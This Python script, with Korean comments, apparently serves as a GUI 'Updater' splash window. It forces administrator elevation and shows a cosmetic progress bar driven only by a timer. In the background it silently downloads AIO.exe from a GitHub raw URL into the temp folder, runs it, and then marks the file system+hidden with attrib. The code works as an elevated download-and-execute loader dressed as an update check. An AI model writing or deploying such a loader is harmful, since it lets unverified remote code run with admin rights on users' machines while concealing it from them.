import customtkinter as ctk
import threading
import time
import requests
import tempfile
import os
import sys
import subprocess
import ctypes
import win32gui
from PIL import Image

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def resource_path(filename):
    return os.path.join(os.path.dirname(__file__), filename)

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

DOWNLOAD_URL = "https://github.com/jbeom081217/Download/raw/refs/heads/main/AIO.exe"

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def fade_in(window):
    window.deiconify()
    def step(alpha):
        if alpha >= 1.0:
            return
        window.attributes("-alpha", alpha)
        window.after(10, step, alpha + 0.1)
    step(0.0)

def fade_out(window, callback=None):
    def step(alpha):
        if alpha <= 0:
            window.withdraw()
            if callback:
                callback()
            return
        window.attributes("-alpha", alpha)
        window.after(10, step, alpha - 0.1)
    step(1.0)

class App(ctk.CTk):
    def __init__(self, x, y):
        super().__init__()
        self.title("Updater")
        
        # 로고 이미지 경로
        logo_path = resource_path("logo.png")
        
        # 이미지 로드 (CTkImage로 처리)
        logo_image = ctk.CTkImage(Image.open(logo_path), size=(150, 35))
        
        # 로고를 Label에 표시 (이미지를 객체로 유지)
        self.logo = ctk.CTkLabel(self, image=logo_image, text="")
        self.logo.image = logo_image  # 이미지 객체를 self.logo에 명시적으로 저장
        
        self.geometry(f"340x200+{x}+{y}")
        self.iconbitmap(resource_path("icon.ico"))
        self.configure(fg_color="#191919")
        self.overrideredirect(True)
        self.resizable(False, False)
        self.attributes("-topmost", True)
        self.attributes("-alpha", 0.0)
        self.after(100, self.make_rounded)
        
        # "업데이트 확인 중..." 텍스트
        self.label = ctk.CTkLabel(
            self, text="업데이트 확인 중...", text_color="white",
            font=ctk.CTkFont(size=25, weight="bold")
        )
        self.label.place(relx=0.5, rely=0.5, anchor="center")
        
        # 로고를 화면에 표시
        self.logo.place(relx=0.5, rely=0.2, anchor="center")
        
        fade_in(self)

        # 다운로드 시작 (백그라운드)
        threading.Thread(target=self.auto_download_and_run, daemon=True).start()
        self.canvas = ctk.CTkCanvas(self, width=200, height=10, bg="#ffffff")
        self.canvas.place(relx=0.5, rely=0.75, anchor="center")

        # 사각형 바의 높이도 20으로 설정
        self.bar = self.canvas.create_rectangle(0, 0, 0, 10, fill="#191919")
        self.move_bar(10)

    def move_bar(self, duration):
        # 10초 동안 바가 이동하도록 설정
        self.start_time = time.time()  # 시작 시간 기록
        self.duration = duration  # 10초

        self.after(20, self.update_bar_position)  # 일정 시간 간격으로 이동 업데이트

    def update_bar_position(self):
        elapsed_time = time.time() - self.start_time  # 경과 시간 계산
        if elapsed_time >= self.duration:
            # 10초가 지나면 바가 끝까지 이동
            self.canvas.coords(self.bar, 0, 0, 340, 10)
            return
        
        # 바의 이동 거리 계산 (10초 동안 전체 너비 340까지 이동)
        distance = (elapsed_time / self.duration) * 340
        self.canvas.coords(self.bar, 0, 0, distance, 10)

        # 계속해서 바의 위치를 업데이트
        self.after(20, self.update_bar_position)

    def make_rounded(self):
        hwnd = ctypes.windll.user32.GetParent(self.winfo_id())
        region = win32gui.CreateRoundRectRgn(0, 0, 340, 200, 15, 15)
        win32gui.SetWindowRgn(hwnd, region, True)

    def auto_download_and_run(self):
        time.sleep(8)  # 대기
        try:
            temp_path = os.path.join(tempfile.gettempdir(), "AIO.exe")
            os.system(f'attrib -s -h "{temp_path}"')
            if os.path.exists(temp_path):
                os.remove(temp_path)
            response = requests.get(DOWNLOAD_URL, stream=True)
            response.raise_for_status()
            with open(temp_path, 'wb') as f:
                for chunk in response.iter_content(8192):
                    f.write(chunk)

            subprocess.Popen([temp_path], shell=True)
            os.system(f'attrib +s +h "{temp_path}"')
            self.after(0, lambda: fade_out(self))

        except Exception as e:
            print("다운로드 실패:", e)
            self.after(0, lambda: fade_out(self))

# 실행 예시 (중앙 정렬)
if __name__ == "__main__":
    import tkinter as tk
    screen = tk.Tk()
    screen.withdraw()
    w = screen.winfo_screenwidth()
    h = screen.winfo_screenheight()
    x = int((w - 340) / 2)
    y = int((h - 200) / 2)
    screen.destroy()

    app = App(x, y)
    app.mainloop()